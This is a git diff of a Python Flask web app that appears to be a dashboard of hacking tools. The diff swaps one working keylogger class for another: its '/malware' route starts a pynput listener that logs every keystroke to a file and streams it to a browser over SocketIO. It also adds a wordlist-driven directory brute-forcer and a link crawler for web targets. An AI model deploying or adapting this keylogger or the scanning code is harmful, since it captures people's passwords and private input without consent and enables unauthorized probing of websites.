@@ -1,10 +1,11 @@
-from flask import Flask, render_template, jsonify, request, Response
+from flask import Flask, render_template, jsonify, request, Response,redirect,url_for,g
 from scapy.all import sniff, IP, TCP, UDP, Raw, DNS
 import socket
 import time
 from network_scanner import main
-from datetime import datetime
+import datetime
 import re
+from bs4 import BeautifulSoup
 import requests
 from sqlinjection import scan_sql_injection
 from urllib.parse import unquote    
@@ -18,8 +19,9 @@ import time
 import requests
 import threading
 from collections import deque
-import requests
 import pynput
+import pynput.keyboard
+from urllib.parse import urljoin
 
 
 app = Flask(__name__)
@@ -238,82 +240,98 @@ def file_interceptor():
     return render_template('file_interceptor.html')
 
 
-@app.route('/code_injector')
-def code_injector():
-    return render_template('code_injector.html')
+@app.route('/redirect_url_scanner', methods=['GET', 'POST'])
+def redirect_url_scanner():
+    if request.method == 'POST':
+        url = request.form['hostname']
+        redirect_links = []
+        try:
+            response = requests.get(url)
+            soup = BeautifulSoup(response.content, 'html.parser')
+            for link in soup.find_all('a'):
+                href = link.get('href')
+                if href and 'http' in href:
+                    redirect_links.append(href)
 
-keystrokes = []
+            # Remove duplicate links
+            redirect_links = list(set(redirect_links))
+            return render_template('redirect_url_scanner.html', is_fetched=True, redirect_links=redirect_links)
 
-class KeyLogger:
-    key_que: deque = deque()
+        except requests.exceptions.RequestException:
+            return 'Error occurred while scanning the URL.'
+    else:
+        return render_template('redirect_url_scanner.html', is_fetched=False)
 
-    def __init__(self):
-        self.listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release, daemon=True)
-        self.key_que.clear()
-        self.listener.start()
-        threading.Thread(target=self.sync_logs).start()
 
-    def on_press(self, key):
-        self.key_que.append(key)
+from flask_socketio import SocketIO
+from pynput import keyboard
+import logging   
+socketio = SocketIO(app)
+file_log = "log.txt"
+logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+def on_press(key):
+    try:
+        key_char = key.char
+    except AttributeError:
+        key_char = str(key)
+    
+    # Log the keystroke to the file
+    logging.info(key_char)
+    
+    # Emit the keystroke to the web client
+    socketio.emit('keystroke', {'key': key_char})
 
-    def on_release(self, key):
-        key_string = " + ".join(list(map(KeyLogger.get_str, self.key_que))).strip()
-        if key_string:
-            with open("key_logs.txt", "a+") as file:
-                file.write(str(datetime.datetime.now().timestamp()) + " :: " + key_string + "\n")
-            print(key_string)
-        self.key_que.clear()
+def start_listener():
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
-    @staticmethod
-    def get_str(key):
-        return str(key)
-
-    def sync_logs(self):
-        while self.listener.is_alive():
-            try:
-                with open("key_logs.txt", "a+") as logs:
-                    logs.seek(0)
-                    data = logs.read().strip()
-                    if data:
-                        res = requests.post("http://127.0.0.1:5000/", data=data.encode("utf-8"))
-                        if res.status_code == 200:
-                            new_data = logs.read()
-                            logs.truncate(0)
-                            logs.write(new_data)
-            except requests.ConnectionError:
-                print("COULDN'T CONNECT")
-            except IOError:
-                print("IO ERROR OCCURRED")
-            time.sleep(2)
-
-    def __del__(self):
-        self.listener.stop()
-
-@app.route("/malware")
+@app.route('/malware')
 def malware():
-    return render_template("malware.html", keystrokes=keystrokes)
+    import threading
+    listener_thread = threading.Thread(target=start_listener)
+    listener_thread.start()
+    return render_template('malware.html')        
 
-@app.route("/malware", methods=["POST"])
-def dump_logs():
-    data = request.data.decode("utf-8")
-    formatted_keystrokes = format_keystrokes(data)
-    keystrokes.append(formatted_keystrokes)
-    return "Success"
+def check_directory(url):
+    try:
+        get_response = requests.get(url)
+        return get_response
+    except requests.exceptions.ConnectionError:
+        pass
 
-def format_keystrokes(data):
-    keystrokes_list = []
-    keystrokes_data = data.split(" ")
-    for keystroke_data in keystrokes_data:
-        if keystroke_data.startswith("'"):
-            keystroke = re.search(r"'(.+)'", keystroke_data).group(1)
-            keystrokes_list.append(keystroke)
-        elif "+" in keystroke_data:
-            keystrokes_combination = keystroke_data.split("+")
-            keystrokes_list.append(" + ".join(keystrokes_combination))
-    return " -> ".join(keystrokes_list)
+def extract_urls(url):
+    response = requests.get(url)
+    return re.findall('(?:href=")(.*?)"', str(response.content))
 
-@app.route('/web_application_hacking')
+def crawl(url):
+    target_links = []
+    href_links = extract_urls(url)
+    for link in href_links:
+        full_link = urljoin(url, link)
+        if "#" in full_link:
+            full_link = full_link.split("#")[0]
+        if url in full_link and full_link not in target_links:
+            target_links.append(full_link)
+    return target_links
+
+@app.route('/web_application_hacking', methods=['GET', 'POST'])
 def web_application_hacking():
+    if request.method == 'POST':
+        if 'check_directory' in request.form:
+            url = request.form['url']
+            with open("dirs.txt", "r") as words:
+                results = []
+                for line in words:
+                    word = line.strip()
+                    link = url + "/" + word
+                    response = check_directory(link)
+                    if response is not None:
+                        results.append("The directory exists --> " + link)
+                return render_template('web_application_hacking.html', results=results)
+        elif 'crawl_links' in request.form:
+            target_url = request.form['target_url']
+            links = crawl(target_url)
+            return render_template('web_application_hacking.html', links=links)
     return render_template('web_application_hacking.html')
 
 @app.route('/vulnerability_scanner')
@@ -419,5 +437,4 @@ def tlsinput():
          return ' No Input Found', 404
 
 if __name__ == '__main__':
-    kl = KeyLogger()
     app.run(debug=True)
